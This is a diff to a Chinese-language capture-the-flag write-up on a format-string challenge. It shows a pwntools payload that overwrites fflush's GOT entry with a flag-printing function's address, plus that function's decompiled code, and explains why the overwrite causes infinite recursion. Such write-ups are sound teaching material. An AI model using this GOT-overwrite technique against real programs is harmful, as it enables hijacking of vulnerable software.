@@ -65,3 +65,38 @@ aaaa61616161%
 ```
 
 然后构造payload=fmtstr_payload(9,{fflush_got:noxflag_addr})想直接getflag，然后实际上没那么简单。调试过后发现fmtstr_payload不全，len(payload)输出检查后发现长度超了，稍微查了下pwntools文档的fmtstr部分，发现它默认是以hhn也就是单字节的形式去构造payload，如果以双字节或四字节的形式要加上write_size参数，这样payload的长度就不会超过40
+```python
+payload = fmtstr_payload(9,{fflush_got:noxFlag_addr},write_size='short')
+```
+
+然而当我们成功修改fflush_got为noxFlag的地址时会进入到一个死循环中，我们看一下noxFlag函数里面不难发现问题
+
+```c
+void __noreturn noxFlag()
+{
+  char i; // [esp+Bh] [ebp-Dh]
+  FILE *stream; // [esp+Ch] [ebp-Ch]
+
+  stream = fopen("flag.txt", "r");
+  puts(s);
+  fflush(stdout);//这里又调用了fflush函数，由于我们把fflush_got改成了noxFlag地址，这里相当递归调用noxFlag，形成死循环
+  if ( stream )
+  {
+    for ( i = fgetc(stream); i != -1; i = fgetc(stream) )
+    {
+      putchar(i);
+      fflush(stdout);
+    }
+    fflush(stdout);
+    fclose(stream);
+  }
+  else
+  {
+    puts("Can't read file \n");
+    fflush(stdout);
+  }
+  exit(0);
+}
+```
+
+当时就卡在这里没绕出去，经过队友提醒能不能改return地址，才发现思路走偏了
